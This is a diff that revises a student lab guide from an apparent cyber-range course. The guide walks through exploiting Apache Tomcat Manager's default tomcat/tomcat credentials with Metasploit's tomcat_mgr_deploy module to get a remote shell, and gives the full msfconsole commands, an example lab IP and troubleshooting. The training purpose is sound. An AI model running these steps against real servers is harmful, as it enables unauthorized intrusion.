@@ -136,16 +136,31 @@ What you can do with this Version strings are gold. Search them in **Exploit-DB*
 
 > **What you're doing & why:** Apache Tomcat has an admin panel called **Manager** that can install web apps. If it still uses the **default password** (`tomcat`/`tomcat`), anyone can log in and upload their own app — which is really code that runs on the server. Metasploit automates all of this: it logs in, deploys a malicious app, triggers it, and gives you a remote shell. This is why **default credentials** are one of the most common real-world weaknesses. 
 
-#### Step 1 — launch Metasploit
+#### Step 1 — get Meta's IP (Kali shell, before Metasploit)
+
+`msfconsole` does **not** expand shell variables. If you type the characters `$TARGET_META` inside Metasploit, the exploit will not reach Meta and you will get **no session**.
+
+In the **Kali** shell (not yet in msf), run:
+
+```bash
+echo $TARGET_META
+```
+
+Remember that IP (same as **Meta** in the lab header; pod 1 is often `10.0.51.20`). You will paste **those digits** into `set RHOSTS` below. When this Guide is loaded in the portal, the Copy button on the next block should already show your real Meta IP in place of `$TARGET_META` — use that.
+
+#### Step 2 — launch Metasploit
 ```bash
 msfconsole -q
 ```
 
-#### Step 2 — configure and run the exploit (inside msfconsole)
+#### Step 3 — configure and run (inside msfconsole)
 
-> **Required lines:** `set PATH /manager/text` and `set TARGET 1`. Without PATH, Manager is hit at the wrong URL. Without TARGET, Metasploit may pick a payload that does not get a shell on this lab. Both must appear in your history before Manual Check.
+> **Required — or you get *Exploit completed, but no session was created*:**  
+> 1. `set RHOSTS` must be the **numeric Meta IP** (not the literal text `$TARGET_META`)  
+> 2. `set PATH /manager/text`  
+> 3. `set TARGET 1` (must be set **before** `run`)
 
-Copy/paste these **one line at a time** (inside `msfconsole`):
+Copy/paste **one line at a time**:
 
 ```bash
 use exploit/multi/http/tomcat_mgr_deploy
@@ -158,40 +173,51 @@ set TARGET 1
 run
 ```
 
-`$TARGET_META` is your Meta IP (same as the lab header; for pod 1 it is often `10.0.51.20`). If the variable is empty, paste the Meta IP from the header instead.
+Verified working shape (pod 1 example — use **your** Meta IP):
+
+```bash
+use exploit/multi/http/tomcat_mgr_deploy
+set RHOSTS 10.0.51.20
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set PATH /manager/text
+set TARGET 1
+run
+```
 
 Command | What it does  
 --- | ---  
 `use …` | select the Tomcat Manager deploy exploit  
-`set RHOSTS` | **R** emote **host** — Meta (`$TARGET_META`)  
-`set RPORT 8180` | **R** emote **port** — where Tomcat listens  
-`set HttpUsername / HttpPassword` | Manager login — defaults `tomcat` / `tomcat`  
+`set RHOSTS` | Meta's **numeric** IP (from Step 1 / lab header)  
+`set RPORT 8180` | Tomcat port  
+`set HttpUsername / HttpPassword` | defaults `tomcat` / `tomcat`  
 `set PATH /manager/text` | **required** Manager API path on this Debian Tomcat  
-`set TARGET 1` | **required** payload target index that works on this lab  
+`set TARGET 1` | **required** payload target — without this, Metasploit often finishes with **no session**  
 `run` | fire the exploit  
 
-#### Step 3 — confirm you're in (inside the new session)
+#### Step 4 — confirm you're in (inside the new session)
 ```bash
 id
 whoami
 ```
 
-`id` and `whoami` confirm _who you are_ on the target. Success looks like:
+Success looks like:
 
 ```text
 uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
 ```
 
-You are running as the Tomcat service account (the numeric uid may differ; the name in parentheses must be `tomcat`).
+(The numeric uid may differ; the name in parentheses must be `tomcat`.)
 
-#### Step 4 — exit the session (required for scoring)
+#### Step 5 — exit the session (required for scoring)
 ```bash
 exit
 ```
 
 > **Why exit matters:** Manual Check reads your **Metasploit history**. That history is not fully written until the session/console activity is flushed — so this milestone can stay FAIL until you actually run `exit`. If it still fails after a working shell, run one more msf command or close `msfconsole` cleanly, then re-check.
 
-**Done when:** your shell showed a `tomcat` context (e.g. `uid=1001(tomcat) …`), your history includes `set PATH /manager/text` and `set TARGET 1`, and you have run `exit`.
+**Done when:** you got a `tomcat` shell (e.g. `uid=1001(tomcat) …`), your msf history includes numeric `set RHOSTS …`, `set PATH /manager/text`, and `set TARGET 1`, and you ran `exit`.
 
 **Then:** **Manual Check** on _Tomcat Manager Exploitation_.
 
@@ -220,6 +246,8 @@ Symptom | Fix
 --- | ---  
 Manual Check FAIL after nmap | Press **Enter** , wait ~1s, check again. Make sure you're in the Kali tab.  
 No route / host down | Confirm the pod is **ACTIVE** ; use the exact IPs from your lab header.  
-Tomcat exploit fails / no shell | Re-check history for **`set PATH /manager/text`** and **`set TARGET 1`**, plus `RPORT 8180` and creds `tomcat`/`tomcat`. Use `$TARGET_META` (or the Meta IP from the lab header).  
+`Exploit completed, but no session was created` | Almost always missing **`set TARGET 1`** before `run`, or `set RHOSTS` was the literal text `$TARGET_META` instead of digits. Fix both, `run` again.  
+Tomcat exploit fails / no shell | History must show **`set PATH /manager/text`**, **`set TARGET 1`**, `RPORT 8180`, creds `tomcat`/`tomcat`, and a numeric Meta IP on `RHOSTS`.  
 Wrong tab | Tasks 1–4 all run from **Kali** , never the Meta tab.  
+Guide still shows `msf6 >` / `search tomcat` / no `TARGET 1` | Hard-refresh the Guide panel; on the host confirm `grep TARGET ~/cyberrange/portal/public/scenarios/scenario_01_network_reconnaissance.md` includes `set TARGET 1`.  
 MMDC Cyber Range · Scenario 1 student guide · for use only inside your assigned lab pod.
